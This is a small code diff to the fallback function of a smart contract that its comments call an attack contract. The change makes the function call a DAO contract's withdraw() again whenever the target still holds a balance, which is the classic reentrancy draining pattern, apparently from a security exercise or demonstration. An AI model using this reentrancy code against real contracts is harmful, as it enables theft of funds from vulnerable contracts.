@@ -56,6 +56,7 @@ def __default__():
     # NOT GOING TO DEPOSIT ANYTHING, KNOW THE DAO ADDRESS
     # USE INTERNAL ATTACK FUNCTION
 
-    self._attack()
+    if self.dao_address.balance > 0:
+        self.dao_contract.withdraw()
 
                        
